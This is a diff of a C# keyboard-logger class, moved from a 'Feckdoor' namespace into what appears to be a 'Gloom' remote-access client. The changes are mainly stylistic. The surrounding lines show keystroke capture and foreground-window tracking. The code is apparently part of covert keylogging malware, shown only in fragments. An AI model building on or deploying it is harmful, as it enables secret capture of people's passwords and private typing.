@@ -3,7 +3,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
 
-namespace Feckdoor.InputLog
+namespace Gloom.Client.Features.Logger.InputLog
 {
 	public class KeyboardLogger : IDisposable
 	{
@@ -20,9 +20,9 @@ namespace Feckdoor.InputLog
 
 		internal void OnKeyboardInput(object? sender, KeyboardInputEventArgs args)
 		{
-			bool capsLock = (User32.GetKeyState(0x14) & 0xffff) != 0;
+			var capsLock = (User32.GetKeyState(0x14) & 0xffff) != 0;
 
-			string currentKey = "";
+			var currentKey = "";
 			if (args.VkCodeEnum.GetVkName(args.Modifier, ref currentKey))
 			{
 				if (currentKey.Equals("CapsLock", StringComparison.OrdinalIgnoreCase))
@@ -37,7 +37,7 @@ namespace Feckdoor.InputLog
 				currentKey = Vk2String(args.VkCode, args.ScanCode, args.Modifier.HasFlag(ModifierKey.Alt));
 
 			if (Config.TheConfig.InputLog.AutoCapitalize)
-				currentKey = (capsLock ^ args.Modifier.HasFlag(ModifierKey.Shift)) ? currentKey.ToUpper() : currentKey.ToLower();
+				currentKey = capsLock ^ args.Modifier.HasFlag(ModifierKey.Shift) ? currentKey.ToUpper() : currentKey.ToLower();
 
 
 			if (Config.TheConfig.InputLog.SuppressModifierKey && ModifierKeysString.Any(key => currentKey.Equals(key, StringComparison.Ordinal)))
@@ -77,7 +77,7 @@ namespace Feckdoor.InputLog
 		{
 			try
 			{
-				byte[] vkBuffer = new byte[256];
+				var vkBuffer = new byte[256];
 				if (!User32.GetKeyboardState(vkBuffer))
 					return ""; // Keyboard state unavailable
 
@@ -108,7 +108,7 @@ namespace Feckdoor.InputLog
 				IntPtr hwnd = User32.GetForegroundWindow();
 
 				// Acquire foreground window thread id bu window id
-				
+
 				User32.GetWindowThreadProcessId(hwnd, out uint pid);
 
 				// Acquire foreground process id by thread id
